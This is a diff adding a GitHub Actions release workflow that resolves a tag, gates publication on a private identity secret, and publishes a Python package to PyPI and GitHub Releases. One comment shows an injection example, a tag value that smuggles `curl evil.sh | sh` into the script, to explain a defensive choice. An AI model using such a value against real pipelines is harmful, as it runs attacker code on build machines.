@@ -1,0 +1,196 @@
+# AI-NOTICE:Schema-Version=0.1
+# AI-NOTICE:License=AGPL-3.0-or-later
+# AI-NOTICE:Author=Gary Bajaj
+# AI-NOTICE:Exploitation-Deterrence=true
+# AI-NOTICE:Operator-Override-Required=true
+# AI-NOTICE:Override-Reason-Required=false
+# AI-NOTICE:Severity=high
+# AI-NOTICE:Escalation=warn
+# AI-NOTICE:Scope=file
+# AI-NOTICE:Contact=https://AImends.bajaj.com/
+
+name: Release
+
+on:
+  push:
+    tags:
+      # Upstream package tags publish to PyPI. Bridgette product tags (v1.*)
+      # are released manually and must not attempt a duplicate PyPI upload.
+      - v0.*
+  workflow_call:
+    inputs:
+      tag:
+        description: 'The tag to release (e.g. v0.70.2)'
+        required: true
+        type: string
+    secrets:
+      AI_NOTICE_PRIVATE_L1_FILE:
+        description: Private operator identity used only by publication preflight
+        required: true
+
+jobs:
+  # Mirrors docker-build-publish.yml: the tag comes from the workflow_call input
+  # when bump-version.yml drives the release, and from the ref when a tag is
+  # pushed by hand.
+  resolve-tag:
+    runs-on: ubuntu-latest
+    # Branches on a string and never touches the token; scope it down explicitly
+    # like the two jobs below rather than inheriting the caller's grant.
+    permissions: {}
+    outputs:
+      tag: ${{ steps.resolve.outputs.tag }}
+    steps:
+      - name: Resolve tag
+        id: resolve
+        # INPUT_TAG is caller-controlled, so it goes through the environment
+        # rather than being interpolated into the script body, where a tag like
+        # `v1"; curl evil.sh | sh; #` would execute (githubactions:S7630).
+        env:
+          INPUT_TAG: ${{ inputs.tag }}
+        run: |
+          if [ -n "$INPUT_TAG" ]; then
+            TAG="$INPUT_TAG"
+          else
+            TAG="${GITHUB_REF#refs/tags/}"
+          fi
+          echo "tag=$TAG" >> $GITHUB_OUTPUT
+
+  pypi:
+    name: Publish to PyPI
+    needs: resolve-tag
+    runs-on: ubuntu-latest
+    # Environment and permissions trusted publishing.
+    environment:
+      # Create this environment in the GitHub repository under Settings -> Environments
+      name: pypi
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Require private publication secret before checkout
+        env:
+          AI_NOTICE_PRIVATE_L1_TEXT: ${{ secrets.AI_NOTICE_PRIVATE_L1_FILE }}
+        run: |
+          if [ -z "$AI_NOTICE_PRIVATE_L1_TEXT" ]; then
+            echo "publication identity gate error: private comparison secret is missing" >&2
+            exit 2
+          fi
+
+      - name: Checkout
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ needs.resolve-tag.outputs.tag }}
+
+      - name: Validate private publication identity before build
+        env:
+          AI_NOTICE_PRIVATE_L1_TEXT: ${{ secrets.AI_NOTICE_PRIVATE_L1_FILE }}
+        run: bash scripts/preflight-publication-identity.sh .
+
+      - name: Install uv
+        uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
+      - name: Install Python 3.11
+        run: uv python install 3.11
+      - name: Build
+        run: uv build
+      - name: Prepare exact publication-gate context
+        run: |
+          mkdir -p publication-gate-context/artifacts
+          git archive --format=tar HEAD > publication-gate-context/exact-source.tar
+          cp dist/* publication-gate-context/artifacts/
+          install -m 0644 scripts/check_publication_identity.py \
+            publication-gate-context/check_publication_identity.py
+          install -m 0644 Dockerfile.publication-gate \
+            publication-gate-context/Dockerfile
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e # v4.3.0
+      - name: Preflight source and generated distributions
+        uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
+        with:
+          context: ./publication-gate-context
+          platforms: linux/amd64
+          push: false
+          outputs: type=cacheonly
+          secrets: |
+            AI_NOTICE_PRIVATE_L1_FILE=${{ secrets.AI_NOTICE_PRIVATE_L1_FILE }}
+      - name: Smoke test (wheel)
+        run: uv run --isolated --no-project --with dist/*.whl nextcloud-mcp-server --help
+      - name: Smoke test (source distribution)
+        run: uv run --isolated --no-project --with dist/*.tar.gz nextcloud-mcp-server --help
+      - name: Publish
+        run: uv publish
+
+  github-release:
+    name: Create GitHub Release
+    # Gated on pypi: a Release announcing a version that failed to publish would
+    # point users at an install that does not exist.
+    needs: [resolve-tag, pypi]
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: Require private publication secret before checkout
+        env:
+          AI_NOTICE_PRIVATE_L1_TEXT: ${{ secrets.AI_NOTICE_PRIVATE_L1_FILE }}
+        run: |
+          if [ -z "$AI_NOTICE_PRIVATE_L1_TEXT" ]; then
+            echo "publication identity gate error: private comparison secret is missing" >&2
+            exit 2
+          fi
+
+      - name: Checkout
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          ref: ${{ needs.resolve-tag.outputs.tag }}
+
+      - name: Validate private publication identity before build
+        env:
+          AI_NOTICE_PRIVATE_L1_TEXT: ${{ secrets.AI_NOTICE_PRIVATE_L1_FILE }}
+        run: bash scripts/preflight-publication-identity.sh .
+
+      # The bump commit that the tag points at is the one commitizen wrote the
+      # CHANGELOG entry in, so the section is always present at this ref.
+      - name: Build release notes
+        env:
+          TAG: ${{ needs.resolve-tag.outputs.tag }}
+        run: |
+          set -euo pipefail
+          ./scripts/extract-changelog.sh "$TAG" > notes.md
+          echo "Prepared release notes for $TAG; publication preflight follows."
+
+      - name: Prepare exact publication-gate context
+        run: |
+          mkdir -p publication-gate-context/artifacts
+          git archive --format=tar HEAD > publication-gate-context/exact-source.tar
+          cp notes.md publication-gate-context/artifacts/
+          install -m 0644 scripts/check_publication_identity.py \
+            publication-gate-context/check_publication_identity.py
+          install -m 0644 Dockerfile.publication-gate \
+            publication-gate-context/Dockerfile
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@37fe631027851001ddb9b187196cc803df7f5f0e # v4.3.0
+
+      - name: Preflight source and release notes
+        uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
+        with:
+          context: ./publication-gate-context
+          platforms: linux/amd64
+          push: false
+          outputs: type=cacheonly
+          secrets: |
+            AI_NOTICE_PRIVATE_L1_FILE=${{ secrets.AI_NOTICE_PRIVATE_L1_FILE }}
+
+      # `gh release create` fails if the release already exists (e.g. a re-run of
+      # this job), so check first and update instead.
+      - name: Create release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TAG: ${{ needs.resolve-tag.outputs.tag }}
+        run: |
+          set -euo pipefail
+          if gh release view "$TAG" >/dev/null 2>&1; then
+            echo "Release $TAG already exists; updating notes."
+            gh release edit "$TAG" --notes-file notes.md
+          else
+            gh release create "$TAG" --title "$TAG" --notes-file notes.md --verify-tag
+          fi
